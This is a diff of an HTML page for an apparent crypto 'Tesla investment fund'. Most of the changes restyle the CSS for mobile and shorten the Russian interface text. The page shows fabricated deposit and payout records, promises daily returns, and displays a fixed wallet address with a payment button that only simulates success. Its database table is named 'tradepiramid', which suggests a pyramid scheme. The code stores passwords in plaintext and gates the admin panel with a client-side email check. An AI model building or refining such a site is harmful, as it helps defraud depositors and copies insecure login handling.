@@ -35,35 +35,37 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 20px 5%;
+            padding: 15px 4%;
             border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-            gap: 15px;
+            gap: 10px;
             flex-wrap: wrap;
         }
 
         .header-left {
             display: flex;
             align-items: center;
-            gap: 20px;
+            justify-content: space-between;
+            width: 100%;
+            gap: 10px;
         }
 
         .logo {
-            font-size: 24px;
+            font-size: 20px;
             font-weight: 700;
             color: var(--accent);
             text-transform: uppercase;
-            letter-spacing: 2px;
+            letter-spacing: 1.5px;
             cursor: pointer;
         }
 
         .auth-buttons {
             display: flex;
-            gap: 10px;
+            gap: 8px;
         }
 
         .auth-btn {
-            padding: 8px 16px;
-            font-size: 13px;
+            padding: 6px 12px;
+            font-size: 12px;
             font-weight: 600;
             border-radius: 6px;
             cursor: pointer;
@@ -78,35 +80,26 @@
             color: #fff;
         }
 
-        .auth-btn.login:hover {
-            border-color: var(--accent);
-            color: var(--accent);
-        }
-
         .auth-btn.register {
             background: var(--accent);
             border: 1px solid var(--accent);
             color: #000;
         }
 
-        .auth-btn.register:hover {
-            opacity: 0.9;
-            box-shadow: 0 0 10px var(--accent-glow);
-        }
-
         .user-profile {
             display: none;
             align-items: center;
-            gap: 10px;
+            gap: 8px;
             background: rgba(255, 255, 255, 0.05);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 6px 14px;
+            padding: 4px 10px;
             border-radius: 20px;
+            flex-wrap: wrap;
         }
 
         .profile-avatar {
-            width: 28px;
-            height: 28px;
+            width: 24px;
+            height: 24px;
             background: var(--accent);
             color: #000;
             border-radius: 50%;
@@ -114,22 +107,26 @@
             align-items: center;
             justify-content: center;
             font-weight: bold;
-            font-size: 13px;
+            font-size: 11px;
         }
 
         .profile-name {
-            font-size: 13px;
+            font-size: 12px;
             color: #fff;
             font-weight: 600;
+            max-width: 110px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
         }
 
         .dashboard-nav-btn {
             background: rgba(0, 255, 136, 0.15);
             color: var(--accent);
             border: 1px solid var(--accent);
-            padding: 6px 12px;
+            padding: 4px 8px;
             border-radius: 6px;
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 700;
             cursor: pointer;
             text-transform: uppercase;
@@ -143,20 +140,15 @@
             cursor: pointer;
             text-transform: uppercase;
             font-weight: 700;
-            margin-left: 5px;
-        }
-
-        .logout-btn:hover {
-            text-decoration: underline;
         }
 
         .admin-nav-btn {
             background: #ffaa00;
             color: #000;
             border: none;
-            padding: 6px 12px;
+            padding: 4px 8px;
             border-radius: 6px;
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 700;
             cursor: pointer;
             text-transform: uppercase;
@@ -165,13 +157,13 @@
 
         .hero {
             text-align: center;
-            padding: 50px 20px 30px;
+            padding: 30px 15px 20px;
             background: radial-gradient(circle at center, rgba(0,255,136,0.05) 0%, transparent 70%);
         }
 
         .hero h1 {
-            font-size: clamp(32px, 5vw, 48px);
-            margin-bottom: 15px;
+            font-size: clamp(24px, 6vw, 42px);
+            margin-bottom: 10px;
             background: linear-gradient(45deg, #fff, var(--accent));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
@@ -179,96 +171,95 @@
 
         .hero p {
             color: var(--text-muted);
-            font-size: clamp(15px, 2vw, 18px);
+            font-size: clamp(13px, 3.5vw, 16px);
             max-width: 650px;
             margin: 0 auto;
         }
 
         .stats-section {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
             max-width: 1200px;
-            margin: 0 auto 40px;
-            padding: 0 20px;
+            margin: 0 auto 30px;
+            padding: 0 15px;
         }
 
         .stat-card {
             background: var(--card-bg);
             border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 12px;
-            padding: 20px;
+            border-radius: 10px;
+            padding: 15px 10px;
             text-align: center;
         }
 
         .stat-value {
-            font-size: clamp(24px, 4vw, 32px);
+            font-size: clamp(18px, 5vw, 28px);
             font-weight: 700;
             color: var(--accent);
-            margin-bottom: 5px;
+            margin-bottom: 4px;
         }
 
         .stat-label {
             color: var(--text-muted);
-            font-size: 12px;
+            font-size: 10px;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
         }
 
         .user-dashboard {
             display: none;
             max-width: 1200px;
-            margin: 30px auto 50px;
-            padding: 0 20px;
+            margin: 20px auto 40px;
+            padding: 0 15px;
         }
 
         .dashboard-header {
             background: var(--card-bg);
             border: 1px solid rgba(0, 255, 136, 0.2);
-            border-radius: 16px;
-            padding: 25px;
-            margin-bottom: 30px;
+            border-radius: 14px;
+            padding: 20px 15px;
+            margin-bottom: 20px;
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 20px;
+            flex-direction: column;
+            gap: 15px;
         }
 
         .dashboard-user-info h2 {
-            font-size: 24px;
+            font-size: 18px;
             color: #fff;
-            margin-bottom: 5px;
+            margin-bottom: 4px;
+            word-break: break-all;
         }
 
         .dashboard-user-info p {
             color: var(--text-muted);
-            font-size: 14px;
+            font-size: 13px;
         }
 
         .dashboard-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
         }
 
         .dash-card {
             background: var(--card-bg);
             border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 14px;
-            padding: 20px;
+            border-radius: 12px;
+            padding: 15px;
         }
 
         .dash-card-title {
-            font-size: 13px;
+            font-size: 11px;
             color: var(--text-muted);
             text-transform: uppercase;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
 
         .dash-card-value {
-            font-size: 28px;
+            font-size: 20px;
             font-weight: 700;
             color: #fff;
         }
@@ -279,18 +270,17 @@
 
         .dashboard-actions {
             display: flex;
-            gap: 15px;
-            margin-bottom: 30px;
-            flex-wrap: wrap;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 25px;
         }
 
         .dash-action-btn {
-            flex: 1;
-            min-width: 160px;
+            width: 100%;
             padding: 12px;
             border-radius: 8px;
             font-weight: 700;
-            font-size: 14px;
+            font-size: 13px;
             cursor: pointer;
             border: none;
             text-transform: uppercase;
@@ -307,45 +297,39 @@
             border: 1px solid rgba(255, 255, 255, 0.2);
         }
 
-        .dash-action-btn.withdraw:hover {
-            border-color: var(--danger);
-            color: var(--danger);
-        }
-
         .container {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 0 20px 40px;
+            padding: 0 15px 30px;
         }
 
         .section-title {
             text-align: center;
-            font-size: clamp(26px, 4vw, 32px);
-            margin-bottom: 30px;
+            font-size: clamp(20px, 5vw, 28px);
+            margin-bottom: 20px;
         }
 
         .story-section {
             max-width: 900px;
-            margin: 0 auto 40px;
-            padding: 25px 20px;
+            margin: 0 auto 30px;
+            padding: 20px 15px;
             background: var(--card-bg);
             border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            border-radius: 14px;
         }
 
         .story-section h2 {
-            font-size: clamp(22px, 3vw, 28px);
-            margin-bottom: 15px;
+            font-size: clamp(18px, 4.5vw, 24px);
+            margin-bottom: 12px;
             color: #fff;
             text-align: center;
         }
 
         .story-section p {
             color: var(--text-muted);
-            font-size: 15px;
-            margin-bottom: 15px;
-            text-align: justify;
+            font-size: 14px;
+            margin-bottom: 12px;
+            text-align: left;
         }
 
         .story-highlight {
@@ -355,8 +339,8 @@
 
         .history-section {
             max-width: 1200px;
-            margin: 0 auto 40px;
-            padding: 0 20px;
+            margin: 0 auto 30px;
+            padding: 0 15px;
         }
 
         .table-responsive {
@@ -364,7 +348,7 @@
             overflow-x: auto;
             -webkit-overflow-scrolling: touch;
             background: var(--card-bg);
-            border-radius: 16px;
+            border-radius: 12px;
             border: 1px solid rgba(255, 255, 255, 0.05);
         }
 
@@ -375,16 +359,16 @@
         }
 
         .history-table th, .history-table td {
-            padding: 14px 18px;
+            padding: 12px 14px;
             text-align: left;
-            font-size: 14px;
+            font-size: 13px;
         }
 
         .history-table th {
             background: rgba(0, 0, 0, 0.2);
             color: var(--text-muted);
             text-transform: uppercase;
-            font-size: 11px;
+            font-size: 10px;
             letter-spacing: 1px;
         }
 
@@ -395,18 +379,18 @@
         .badge-deposit {
             color: var(--accent);
             background: rgba(0, 255, 136, 0.1);
-            padding: 4px 10px;
+            padding: 3px 8px;
             border-radius: 20px;
-            font-size: 11px;
+            font-size: 10px;
             font-weight: 600;
         }
 
         .badge-payout {
             color: #38bdf8;
             background: rgba(56, 189, 248, 0.1);
-            padding: 4px 10px;
+            padding: 3px 8px;
             border-radius: 20px;
-            font-size: 11px;
+            font-size: 10px;
             font-weight: 600;
         }
         
@@ -414,34 +398,27 @@
             display: inline-block;
             background: rgba(56, 189, 248, 0.15);
             color: #38bdf8;
-            padding: 2px 8px;
+            padding: 2px 6px;
             border-radius: 4px;
             font-family: monospace;
-            font-size: 12px;
-            margin-left: 8px;
+            font-size: 11px;
+            margin-left: 6px;
         }
 
         .plans-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 20px;
-            margin-bottom: 40px;
+            grid-template-columns: 1fr;
+            gap: 15px;
+            margin-bottom: 30px;
         }
 
         .plan-card {
             background: var(--card-bg);
             border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 16px;
-            padding: 30px 20px;
+            border-radius: 14px;
+            padding: 25px 15px;
             text-align: center;
             position: relative;
-            transition: transform 0.3s, box-shadow 0.3s;
-        }
-
-        .plan-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 30px var(--accent-glow);
-            border-color: var(--accent);
         }
 
         .plan-card.featured {
@@ -451,41 +428,41 @@
         .plan-card.featured::before {
             content: 'Best Value';
             position: absolute;
-            top: -12px;
+            top: -10px;
             left: 50%;
             transform: translateX(-50%);
             background: var(--accent);
             color: #000;
-            font-size: 11px;
+            font-size: 10px;
             font-weight: 700;
-            padding: 4px 12px;
+            padding: 3px 10px;
             border-radius: 20px;
             text-transform: uppercase;
         }
 
         .plan-title {
-            font-size: 22px;
-            margin-bottom: 10px;
+            font-size: 20px;
+            margin-bottom: 8px;
         }
 
         .plan-range {
-            font-size: 26px;
+            font-size: 22px;
             font-weight: 700;
             color: var(--accent);
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
 
         .plan-features {
             list-style: none;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             text-align: left;
         }
 
         .plan-features li {
-            padding: 8px 0;
+            padding: 7px 0;
             border-bottom: 1px solid rgba(255, 255, 255, 0.05);
             color: var(--text-muted);
-            font-size: 14px;
+            font-size: 13px;
             display: flex;
             justify-content: space-between;
         }
@@ -497,22 +474,17 @@
         .btn {
             display: inline-block;
             width: 100%;
-            padding: 14px;
+            padding: 12px;
             background: var(--accent);
             color: #000;
             border: none;
             border-radius: 8px;
-            font-size: 16px;
+            font-size: 14px;
             font-weight: 700;
             cursor: pointer;
             text-transform: uppercase;
             text-decoration: none;
-            transition: opacity 0.2s;
             -webkit-tap-highlight-color: transparent;
-        }
-
-        .btn:hover {
-            opacity: 0.9;
         }
 
         .modal-overlay {
@@ -522,21 +494,21 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.75);
-            backdrop-filter: blur(5px);
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(4px);
             justify-content: center;
             align-items: center;
             z-index: 1000;
-            padding: 15px;
+            padding: 10px;
         }
 
         .modal {
             background: var(--card-bg);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 16px;
-            padding: 25px 20px;
+            border-radius: 14px;
+            padding: 20px 15px;
             width: 100%;
-            max-width: 480px;
+            max-width: 420px;
             position: relative;
             text-align: center;
             box-shadow: 0 15px 30px rgba(0,0,0,0.5);
@@ -545,90 +517,84 @@
         }
 
         .modal h3 {
-            font-size: 22px;
-            margin-bottom: 8px;
+            font-size: 19px;
+            margin-bottom: 6px;
             color: #fff;
         }
 
         .modal p {
             color: var(--text-muted);
-            font-size: 13px;
-            margin-bottom: 15px;
+            font-size: 12px;
+            margin-bottom: 12px;
         }
 
         .amount-input-group {
-            margin-bottom: 15px;
+            margin-bottom: 12px;
             text-align: left;
         }
 
         .amount-input-group label {
             display: block;
-            margin-bottom: 6px;
+            margin-bottom: 4px;
             color: var(--text-muted);
-            font-size: 13px;
+            font-size: 12px;
         }
 
         .amount-input-group input, .amount-input-group select {
             width: 100%;
-            padding: 12px;
+            padding: 10px;
             background: var(--bg-color);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 8px;
             color: #fff;
-            font-size: 16px;
+            font-size: 15px;
             outline: none;
         }
 
         .auth-actions-row {
             display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-top: 10px;
+            flex-direction: column;
+            gap: 8px;
+            margin-top: 8px;
         }
 
         .auth-error-badge {
             background: rgba(255, 77, 77, 0.15);
             border: 1px solid var(--danger);
             color: var(--danger);
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 600;
-            padding: 8px 12px;
+            padding: 8px 10px;
             border-radius: 6px;
             display: none;
         }
 
         .auth-success-badge {
             color: var(--accent);
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 700;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             display: none;
         }
 
         .payment-methods {
             display: flex;
             flex-direction: column;
-            gap: 10px;
-            margin-bottom: 20px;
+            gap: 8px;
+            margin-bottom: 15px;
         }
 
         .pay-btn {
-            padding: 12px;
+            padding: 10px;
             background: var(--bg-color);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 8px;
             color: #fff;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.2s;
             -webkit-tap-highlight-color: transparent;
-        }
-
-        .pay-btn:hover {
-            border-color: var(--accent);
-            color: var(--accent);
-            box-shadow: 0 0 15px var(--accent-glow);
         }
 
         .checkout-box {
@@ -640,13 +606,13 @@
             background: var(--bg-color);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 8px;
-            padding: 12px;
-            margin-bottom: 15px;
-            font-size: 13px;
+            padding: 10px;
+            margin-bottom: 12px;
+            font-size: 12px;
         }
 
         .invoice-details p {
-            margin-bottom: 6px;
+            margin-bottom: 4px;
             color: var(--text-main);
         }
 
@@ -656,30 +622,30 @@
         }
 
         .qr-placeholder {
-            width: 120px;
-            height: 120px;
+            width: 100px;
+            height: 100px;
             background: #fff;
-            margin: 0 auto 15px;
+            margin: 0 auto 12px;
             display: flex;
             align-items: center;
             justify-content: center;
             border-radius: 8px;
             font-weight: bold;
             color: #000;
-            font-size: 11px;
+            font-size: 10px;
             text-align: center;
-            padding: 10px;
+            padding: 8px;
         }
 
         .wallet-address {
             background: var(--bg-color);
-            padding: 10px;
+            padding: 8px;
             border-radius: 6px;
             font-family: monospace;
-            font-size: 11px;
+            font-size: 10px;
             color: var(--accent);
             word-break: break-all;
-            margin-bottom: 15px;
+            margin-bottom: 12px;
             border: 1px dashed rgba(0, 255, 136, 0.3);
             text-align: center;
         }
@@ -690,9 +656,9 @@
         }
 
         .success-icon {
-            font-size: 45px;
+            font-size: 38px;
             color: var(--accent);
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
 
         .close-btn {
@@ -700,62 +666,68 @@
             border: none;
             color: var(--text-muted);
             cursor: pointer;
-            font-size: 13px;
+            font-size: 12px;
             text-transform: uppercase;
             font-weight: 700;
-            padding: 10px;
+            padding: 8px;
             width: 100%;
-        }
-
-        .close-btn:hover {
-            color: #fff;
         }
 
         .admin-section {
             display: none;
             max-width: 1200px;
-            margin: 40px auto;
-            padding: 20px;
+            margin: 20px auto;
+            padding: 15px;
             background: var(--card-bg);
             border: 1px solid #ffaa00;
-            border-radius: 16px;
+            border-radius: 14px;
         }
 
         .admin-section h2 {
             color: #ffaa00;
-            margin-bottom: 15px;
-            font-size: 22px;
+            margin-bottom: 10px;
+            font-size: 18px;
         }
 
         footer {
             text-align: center;
-            padding: 30px 20px;
+            padding: 20px 15px;
             color: var(--text-muted);
-            font-size: 13px;
+            font-size: 12px;
             border-top: 1px solid rgba(255, 255, 255, 0.05);
-            margin-top: 40px;
+            margin-top: 30px;
         }
 
-        @media (max-width: 480px) {
+        /* Десктопные стили (отдельно для планшетов и ПК) */
+        @media (min-width: 768px) {
             header {
-                padding: 15px 4%;
-                justify-content: center;
+                padding: 20px 5%;
             }
             .header-left {
-                width: 100%;
+                width: auto;
+            }
+            .logo {
+                font-size: 24px;
+            }
+            .stats-section {
+                grid-template-columns: repeat(4, 1fr);
+            }
+            .dashboard-header {
+                flex-direction: row;
+                align-items: center;
                 justify-content: space-between;
             }
-            .hero {
-                padding: 35px 15px 20px;
+            .dashboard-grid {
+                grid-template-columns: repeat(4, 1fr);
             }
-            .story-section {
-                padding: 20px 15px;
+            .dashboard-actions {
+                flex-direction: row;
             }
-            .modal {
-                padding: 20px 15px;
+            .plans-grid {
+                grid-template-columns: repeat(3, 1fr);
             }
             .auth-actions-row {
-                flex-direction: column;
+                flex-direction: row;
             }
         }
     </style>
@@ -786,7 +758,7 @@
                 <h2 id="dashUserEmail">Пользователь</h2>
                 <p>Статус: <span style="color: var(--accent); font-weight: 600;">Активный инвестор</span></p>
             </div>
-            <button class="dash-action-btn deposit" style="flex: none; padding: 10px 20px;" onclick="scrollToPlans()">+ Пополнить баланс</button>
+            <button class="dash-action-btn deposit" style="flex: none; width: auto; padding: 10px 20px;" onclick="scrollToPlans()">+ Пополнить баланс</button>
         </div>
 
         <div class="dashboard-grid">
@@ -814,7 +786,7 @@
         </div>
 
         <div class="history-section" style="padding: 0; margin-bottom: 0;">
-            <h3 style="margin-bottom: 15px; color: #fff;">Мои операции</h3>
+            <h3 style="margin-bottom: 12px; color: #fff; font-size: 16px;">Мои операции</h3>
             <div class="table-responsive">
                 <table class="history-table">
                     <thead>
@@ -866,8 +838,7 @@
         <section class="story-section">
             <h2>Our Story & Mission</h2>
             <p>The era of electric vehicles and autonomous technology has arrived faster than the world expected. At the heart of this revolution is <span class="story-highlight">Tesla, Inc.</span> — a company that doesn't just manufacture electric cars, but shapes the energy future of the entire planet.</p>
-            <p>Our fund was founded by engineers and crypto enthusiasts with a clear goal: to unite private capital for large-scale investments in Tesla shares and the development of autonomous fleet infrastructure projects. We believe Elon Musk's technologies will define the economic development vector for decades to come.</p>
-            <p>Every dollar raised works to the maximum, bringing high returns to investors and accelerating the global transition to clean energy.</p>
+            <p>Our fund was founded by engineers and crypto enthusiasts with a clear goal: to unite private capital for large-scale investments in Tesla shares and the development of autonomous fleet infrastructure projects.</p>
         </section>
 
         <div class="history-section">
@@ -888,21 +859,21 @@
                             <td><span class="badge-deposit">DEPOSIT</span></td>
                             <td>user***94</td>
                             <td>$250</td>
-                            <td>USDT TRC20 (TJ9v2kX8sL1mN4pQ...)</td>
+                            <td>USDT TRC20 (TJ9v2kX8s...)</td>
                             <td style="color: var(--accent);">Completed</td>
                         </tr>
                         <tr>
                             <td><span class="badge-payout">PAYOUT</span></td>
                             <td>investor***12</td>
                             <td>$120</td>
-                            <td>Bitcoin (1A1zP1eP5QGefi2D...)</td>
+                            <td>Bitcoin (1A1zP1eP...)</td>
                             <td style="color: var(--accent);">Processed</td>
                         </tr>
                         <tr>
                             <td><span class="badge-deposit">DEPOSIT</span></td>
                             <td>crypto***88</td>
                             <td>$45</td>
-                            <td>Банковская карта (4276 3800 1234 5678)</td>
+                            <td>Банковская карта (4276...)</td>
                             <td style="color: var(--accent);">Completed</td>
                         </tr>
                     </tbody>
@@ -952,9 +923,9 @@
 
     <!-- Admin Panel Section -->
     <div class="admin-section" id="adminSection">
-        <h2>База зарегистрированных пользователей (Supabase)</h2>
-        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 15px;">Нажмите на email пользователя, чтобы перейти в его личный кабинет.</p>
-        <button class="btn" style="width: auto; padding: 8px 16px; margin-bottom: 15px; background: #ffaa00;" onclick="loadAdminUsers()">Обновить данные</button>
+        <h2>База пользователей (Supabase)</h2>
+        <p style="color: var(--text-muted); font-size: 12px; margin-bottom: 12px;">Нажмите на email, чтобы перейти в кабинет.</p>
+        <button class="btn" style="width: auto; padding: 6px 12px; margin-bottom: 12px; background: #ffaa00; font-size: 12px;" onclick="loadAdminUsers()">Обновить</button>
         <div class="table-responsive">
             <table class="history-table">
                 <thead>
@@ -966,7 +937,7 @@
                     </tr>
                 </thead>
                 <tbody id="adminUsersBody">
-                    <tr><td colspan="4" style="text-align: center; color: var(--text-muted);">Загрузка пользователей...</td></tr>
+                    <tr><td colspan="4" style="text-align: center; color: var(--text-muted);">Загрузка...</td></tr>
                 </tbody>
             </table>
         </div>
@@ -979,7 +950,7 @@
                 <h3 id="authTitle">Вход в аккаунт</h3>
                 <p id="authDesc">Введите данные для авторизации</p>
 
-                <div class="auth-success-badge" id="authSuccessBadge">Регистрация прошла успешно!</div>
+                <div class="auth-success-badge" id="authSuccessBadge">Успешно!</div>
 
                 <div class="amount-input-group">
                     <label>Email:</label>
@@ -992,7 +963,7 @@
 
                 <div class="auth-actions-row">
                     <button class="btn" id="authSubmitBtn" onclick="submitAuth()">Войти</button>
-                    <div class="auth-error-badge" id="authErrorBadge">Неверный пароль или логин</div>
+                    <div class="auth-error-badge" id="authErrorBadge">Ошибка в данных</div>
                 </div>
 
                 <br>
@@ -1009,10 +980,10 @@
                 </div>
 
                 <div class="payment-methods">
-                    <button class="pay-btn" onclick="proceedToCheckout('USDT')">Криптокошелек USDT (TRC20)</button>
-                    <button class="pay-btn" onclick="proceedToCheckout('BTC')">Криптокошелек Bitcoin (BTC)</button>
-                    <button class="pay-btn" onclick="proceedToCheckout('ETH')">Криптокошелек Ethereum (ETH)</button>
-                    <button class="pay-btn" onclick="proceedToCheckout('CARD')">Банковская карта (Visa / MIR)</button>
+                    <button class="pay-btn" onclick="proceedToCheckout('USDT')">USDT (TRC20)</button>
+                    <button class="pay-btn" onclick="proceedToCheckout('BTC')">Bitcoin (BTC)</button>
+                    <button class="pay-btn" onclick="proceedToCheckout('ETH')">Ethereum (ETH)</button>
+                    <button class="pay-btn" onclick="proceedToCheckout('CARD')">Банковская карта</button>
                 </div>
                 <button class="close-btn" onclick="closeModal()">Cancel</button>
             </div>
@@ -1020,15 +991,15 @@
             <!-- Окно вывода средств -->
             <div id="stepWithdraw" style="display: none;">
                 <h3>Вывод средств</h3>
-                <p>Минимальная сумма вывода: $10</p>
+                <p>Мин. сумма: $10</p>
                 
                 <div class="amount-input-group">
-                    <label>Куда хотите вывести (Реквизиты):</label>
-                    <input type="text" id="withdrawDestination" placeholder="Номер карты или криптокошелек">
+                    <label>Реквизиты:</label>
+                    <input type="text" id="withdrawDestination" placeholder="Номер карты или кошелек">
                 </div>
 
                 <div class="amount-input-group">
-                    <label>Куда выводить (Платежная система):</label>
+                    <label>Система:</label>
                     <select id="withdrawSystem">
                         <option value="Банковская карта">Банковская карта</option>
                         <option value="USDT TRC20">USDT TRC20</option>
@@ -1038,7 +1009,7 @@
                 </div>
 
                 <div class="amount-input-group">
-                    <label>Сколько хотите вывести ($):</label>
+                    <label>Сумма ($):</label>
                     <input type="number" id="withdrawAmount" min="10" placeholder="10">
                 </div>
 
@@ -1049,7 +1020,7 @@
 
             <div class="checkout-box" id="stepCheckout">
                 <h3>Complete Payment</h3>
-                <p>Transfer the exact amount to the address below:</p>
+                <p>Transfer the exact amount:</p>
                 
                 <div class="invoice-details">
                     <p>Plan: <span id="checkPlan">Novice</span></p>
@@ -1057,7 +1028,7 @@
                     <p>Method: <span id="checkMethod">USDT</span></p>
                 </div>
 
-                <div class="qr-placeholder">SCAN QR CODE</div>
+                <div class="qr-placeholder">SCAN QR</div>
                 <div class="wallet-address" id="checkAddress">TJ9v2kX8sL1mN4pQ7wE3rT6yU9iO2aS5dF</div>
 
                 <button class="btn" onclick="simulateSuccess()">I have made the payment</button>
@@ -1068,7 +1039,7 @@
             <div class="success-screen" id="stepSuccess">
                 <div class="success-icon">&#10004;</div>
                 <h3>Payment Successful!</h3>
-                <p>Your funds have been successfully deposited and assigned to your investment plan. Generating daily returns...</p>
+                <p>Your funds have been successfully deposited.</p>
                 <button class="btn" onclick="closeModal()">Done</button>
             </div>
         </div>
@@ -1133,7 +1104,6 @@
 
         const ADMIN_EMAIL = 'binarpok@gmail.com';
 
-        // Форматирование данных пользователя с защитой от undefined/null
         function getCleanUserData(rawObj) {
             let parsed = typeof rawObj === 'string' ? JSON.parse(rawObj) : (rawObj || {});
             return {
@@ -1281,19 +1251,19 @@
             let system = document.getElementById('withdrawSystem').value;
 
             if (!destination) {
-                alert('Пожалуйста, укажите реквизиты для вывода!');
+                alert('Укажите реквизиты!');
                 return;
             }
 
             if (isNaN(amount) || amount < 10) {
-                alert('Минимальная сумма для вывода составляет 10 единиц!');
+                alert('Мин. сумма вывода: $10');
                 return;
             }
 
             let userData = getCleanUserData(localStorage.getItem('user_data_' + email));
             
             if (userData.balance < amount) {
-                alert('Недостаточно средств на балансе для вывода!');
+                alert('Недостаточно средств!');
                 return;
             }
 
@@ -1311,7 +1281,7 @@
             saveToSupabase(email, userData);
             loadUserData(email);
 
-            alert(`Заявка на вывод $${amount} успешно создана!`);
+            alert(`Заявка на вывод $${amount} создана!`);
             closeModal();
         }
 
@@ -1328,10 +1298,10 @@
 
             isRegisterMode = (type === 'register');
             if (isRegisterMode) {
-                authTitle.innerText = 'Регистрация аккаунта';
+                authTitle.innerText = 'Регистрация';
                 authSubmitBtn.innerText = 'Зарегистрироваться';
             } else {
-                authTitle.innerText = 'Вход в аккаунт';
+                authTitle.innerText = 'Вход';
                 authSubmitBtn.innerText = 'Войти';
             }
 
@@ -1354,36 +1324,33 @@
             if (isRegisterMode) {
                 if (supabaseClient) {
                     try {
-                        let { data, error } = await supabaseClient
+                        let { data } = await supabaseClient
                             .from('tradepiramid')
                             .select('username')
                             .eq('username', emailVal);
 
                         if (data && data.length > 0) {
-                            authErrorBadge.innerText = 'Аккаунт с таким email уже существует!';
+                            authErrorBadge.innerText = 'Аккаунт уже существует!';
                             authErrorBadge.style.display = 'inline-block';
                             return;
                         }
                     } catch (e) {
-                        console.warn('Check existing user error:', e);
+                        console.warn(e);
                     }
                 }
 
-                authSuccessBadge.innerText = 'Регистрация прошла успешно! Вход...';
+                authSuccessBadge.innerText = 'Успешно! Вход...';
                 authSuccessBadge.style.display = 'block';
 
                 let initialUserData = getCleanUserData({});
 
                 if (supabaseClient) {
                     try {
-                        const { error } = await supabaseClient.from('tradepiramid').insert([
+                        await supabaseClient.from('tradepiramid').insert([
                             { id148877: Date.now(), username: emailVal, password: passwordVal, user_data: JSON.stringify(initialUserData) }
                         ]);
-                        if (error) {
-                            console.error('Ошибка записи в Supabase:', error.message);
-                        }
                     } catch (err) {
-                        console.warn('Supabase sync notice:', err);
+                        console.warn(err);
                     }
                 }
 
@@ -1393,14 +1360,14 @@
                     loginUserSession(emailVal);
                     closeModal();
                     toggleDashboard(true);
-                }, 600);
+                }, 500);
 
             } else {
                 let loginSuccess = false;
 
                 if (supabaseClient) {
                     try {
-                        let { data, error } = await supabaseClient
+                        let { data } = await supabaseClient
                             .from('tradepiramid')
                             .select('*')
                             .eq('username', emailVal)
@@ -1410,7 +1377,7 @@
                             loginSuccess = true;
                         }
                     } catch (e) {
-                        console.warn('Supabase login check warning:', e);
+                        console.warn(e);
                     }
                 }
 
@@ -1419,7 +1386,7 @@
                     closeModal();
                     toggleDashboard(true);
                 } else {
-                    authErrorBadge.innerText = 'Неверный пароль или логин';
+                    authErrorBadge.innerText = 'Неверный логин или пароль';
                     authErrorBadge.style.display = 'inline-block';
                 }
             }
@@ -1435,9 +1402,7 @@
 
         function toggleAdminPanel() {
             let currentUser = localStorage.getItem('apex_logged_user');
-            if (!currentUser || currentUser.trim().toLowerCase() !== ADMIN_EMAIL) {
-                return;
-            }
+            if (!currentUser || currentUser.trim().toLowerCase() !== ADMIN_EMAIL) return;
 
             const adminSection = document.getElementById('adminSection');
             if (adminSection.style.display === 'block') {
@@ -1451,22 +1416,20 @@
 
         async function loadAdminUsers() {
             let currentUser = localStorage.getItem('apex_logged_user');
-            if (!currentUser || currentUser.trim().toLowerCase() !== ADMIN_EMAIL) {
-                return;
-            }
+            if (!currentUser || currentUser.trim().toLowerCase() !== ADMIN_EMAIL) return;
 
             const tbody = document.getElementById('adminUsersBody');
-            tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted);">Загрузка пользователей...</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted);">Загрузка...</td></tr>';
 
             if (!supabaseClient) {
-                tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--danger);">Supabase не подключен</td></tr>';
+                tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--danger);">Нет связи с БД</td></tr>';
                 return;
             }
 
             try {
                 let { data, error } = await supabaseClient.from('tradepiramid').select('*');
                 if (error || !data || data.length === 0) {
-                    tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted);">Записи не найдены или нет доступа</td></tr>';
+                    tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted);">Пусто</td></tr>';
                     return;
                 }
 
@@ -1490,13 +1453,13 @@
                     tbody.appendChild(row);
                 });
             } catch (err) {
